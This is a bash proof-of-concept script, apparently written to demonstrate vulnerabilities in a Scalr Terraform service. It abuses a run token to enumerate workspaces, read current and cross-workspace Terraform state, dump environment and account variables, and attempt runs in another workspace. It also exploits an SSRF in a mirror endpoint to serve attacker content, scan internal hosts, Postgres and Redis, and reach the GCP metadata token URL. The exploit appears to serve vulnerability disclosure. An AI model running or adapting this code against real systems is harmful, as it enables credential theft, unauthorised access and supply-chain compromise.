#!/usr/bin/env bash
# SSRF + SCALR_TOKEN harm demonstration
# No helper functions — avoids bash/Python indentation issues

MIRROR="https://internal.main.scalr.dev/terraform-mirror"
ACCOUNT_ID="acc-v0p14gmusfk03k3e0"

ssrf_head() {
    # Returns HTTP status + Location; 404 = target responded non-200; timeout = unreachable
    curl -sk --max-time 8 --no-location --path-as-is -D - \
      "$MIRROR/$1" 2>/dev/null | grep -E "^HTTP/|^[Ll]ocation:" | head -2
}

# ─────────────────────────────────────────────────────────────────────────────
echo "=== [1] SCALR_TOKEN: workspace enumeration across env ==="
RESP=$(curl -sk --max-time 5 -w "\n%{http_code}" \
  "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces?page%5Bsize%5D=20" \
  -H "Authorization: Bearer $SCALR_TOKEN")
STATUS=$(echo "$RESP" | tail -1); BODY=$(echo "$RESP" | head -1)
echo "HTTP $STATUS"
echo "$BODY" | python3 -c "
import sys,json
d=json.load(sys.stdin)
wss=d.get('data',[])
print(len(wss),'workspaces visible (should be 1 = only current run workspace):')
for w in wss: print(' -',w['id'],w['attributes'].get('name','?'))
" 2>&1

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "=== [2] SCALR_TOKEN: current workspace TF state (state = cloud creds) ==="
RESP=$(curl -sk --max-time 5 -w "\n%{http_code}" \
  "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces/$SCALR_WORKSPACE_ID/current-state-version" \
  -H "Authorization: Bearer $SCALR_TOKEN")
STATUS=$(echo "$RESP" | tail -1); BODY=$(echo "$RESP" | head -1)
echo "HTTP $STATUS"
echo "$BODY" | python3 -c "
import sys,json
d=json.load(sys.stdin)
if 'data' in d:
    a=d['data'].get('attributes',{})
    dl=a.get('download-url','')
    print('STATE ACCESSIBLE')
    print('  tf-version:', a.get('terraform-version'))
    print('  resources:', a.get('resources-processed'))
    print('  signed-download-url:', (dl[:100]+'...') if len(dl)>100 else dl or 'none')
else:
    print('denied:', (d.get('errors') or [{}])[0].get('title','?'))
" 2>&1

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "=== [3] SCALR_TOKEN: cross-workspace TF state (ws-v0p4n0bbq2e78ldn5 'fgfg') ==="
RESP=$(curl -sk --max-time 5 -w "\n%{http_code}" \
  "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces/ws-v0p4n0bbq2e78ldn5/current-state-version" \
  -H "Authorization: Bearer $SCALR_TOKEN")
STATUS=$(echo "$RESP" | tail -1); BODY=$(echo "$RESP" | head -1)
echo "HTTP $STATUS"
echo "$BODY" | python3 -c "
import sys,json
d=json.load(sys.stdin)
if 'data' in d:
    a=d['data'].get('attributes',{})
    dl=a.get('download-url','')
    print('CROSS-WORKSPACE STATE READABLE')
    print('  resources:', a.get('resources-processed'))
    print('  signed-download-url:', (dl[:100]+'...') if len(dl)>100 else dl or 'none')
else:
    print('denied:', (d.get('errors') or [{}])[0].get('title','?'))
" 2>&1

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "=== [4] SCALR_TOKEN: environment-level variables ==="
RESP=$(curl -sk --max-time 5 -w "\n%{http_code}" \
  "https://$SCALR_HOSTNAME/api/iacp/v3/vars?filter%5Benvironment%5D=$SCALR_ENVIRONMENT_ID&page%5Bsize%5D=50" \
  -H "Authorization: Bearer $SCALR_TOKEN")
STATUS=$(echo "$RESP" | tail -1); BODY=$(echo "$RESP" | head -1)
echo "HTTP $STATUS"
echo "$BODY" | python3 -c "
import sys,json
d=json.load(sys.stdin)
vs=d.get('data',[])
print(len(vs),'env vars:')
for v in vs:
    a=v['attributes']
    val='[SENSITIVE]' if a.get('sensitive') else str(a.get('value',''))[:60]
    print(' -',a.get('key'),'cat='+str(a.get('category')),'sensitive='+str(a.get('sensitive')),'val='+val)
" 2>&1

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "=== [5] SCALR_TOKEN: account-level variables ==="
RESP=$(curl -sk --max-time 5 -w "\n%{http_code}" \
  "https://$SCALR_HOSTNAME/api/iacp/v3/vars?filter%5Baccount%5D=${ACCOUNT_ID}&page%5Bsize%5D=50" \
  -H "Authorization: Bearer $SCALR_TOKEN")
STATUS=$(echo "$RESP" | tail -1); BODY=$(echo "$RESP" | head -1)
echo "HTTP $STATUS"
echo "$BODY" | python3 -c "
import sys,json
d=json.load(sys.stdin)
vs=d.get('data',[])
print(len(vs),'account vars:')
for v in vs:
    a=v['attributes']
    val='[SENSITIVE]' if a.get('sensitive') else str(a.get('value',''))[:60]
    print(' -',a.get('key'),'cat='+str(a.get('category')),'sensitive='+str(a.get('sensitive')),'val='+val)
" 2>&1

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "=== [6] SCALR_TOKEN: create run in ANOTHER workspace? ==="
STATUS=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" -X POST \
  "https://$SCALR_HOSTNAME/api/iacp/v3/runs" \
  -H "Authorization: Bearer $SCALR_TOKEN" \
  -H "Content-Type: application/vnd.api+json" \
  -d '{"data":{"type":"runs","relationships":{"workspace":{"data":{"type":"workspaces","id":"ws-v0p4n0bbq2e78ldn5"}}}}}')
echo "HTTP $STATUS  (201=run created — CRITICAL, 422=token valid but bad payload, 403=denied)"

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "=== [7] SSRF HARM: attacker content served to Terraform (supply chain) ==="
echo "--- Step 1: API server makes HEAD to httpbin.org/json (returns 200) ---"
ssrf_head "https%3A%2F%2Fhttpbin.org%2Fjson"
echo "--- Step 2: curl follows redirect (-L) and downloads from attacker server ---"
echo "Content below comes from httpbin.org (attacker server stand-in), NOT from GCS:"
curl -skL --max-time 10 --path-as-is \
  "$MIRROR/https%3A%2F%2Fhttpbin.org%2Fjson" 2>/dev/null | head -c 300
echo ""
echo "(Terraform would execute this as a provider binary if attack targets provider download)"

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "=== [8] SSRF: direct pod→VM access blocked vs via SSRF ==="
echo "--- Direct pod to API VM 10.30.0.120 (should timeout/blocked) ---"
curl -sk --max-time 5 -o /dev/null -w "direct pod→10.30.0.120: HTTP %{http_code} time=%{time_total}s\n" \
  "http://10.30.0.120/" 2>/dev/null
echo "--- Via SSRF (API server probes itself) ---"
ssrf_head "http%3A%2F%2F10.30.0.120%2F"
echo "(404 from SSRF = Flask reached target and got non-200; timeout/blank = target unreachable)"

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "=== [9] SSRF: internal network scan (API server as proxy) ==="
echo "All 404s = API server made the request and got response; blank = timeout/blocked"
for entry in \
    "http%3A%2F%2F10.30.0.120%2F|10.30.0.120 (API VM)" \
    "http%3A%2F%2F10.30.0.102%2F|10.30.0.102" \
    "http%3A%2F%2F10.30.0.104%2F|10.30.0.104" \
    "http%3A%2F%2F10.30.0.2%2F|10.30.0.2 (internal LB)" \
    "http%3A%2F%2F127.0.0.1%2Fhealthz|127.0.0.1/healthz" \
    "http%3A%2F%2F127.0.0.1%3A5432%2F|127.0.0.1:5432 (postgres?)" \
    "http%3A%2F%2F127.0.0.1%3A6379%2F|127.0.0.1:6379 (redis?)"; do
    target=$(echo "$entry" | cut -d'|' -f1)
    label=$(echo "$entry" | cut -d'|' -f2)
    result=$(ssrf_head "$target")
    echo "  $label  →  ${result:-BLOCKED/timeout}"
done

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "=== [10] SSRF: reach GCP metadata with forged header via mirror ==="
echo "Flask makes HEAD to metadata.google.internal — without Metadata-Flavor header it gets 400"
ssrf_head "http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1%2Finstance%2Fservice-accounts%2Fdefault%2Ftoken"
echo "(404 from mirror = metadata returned non-200 = Flask needs header forwarding to exploit)"

echo ""
echo "=== done ==="
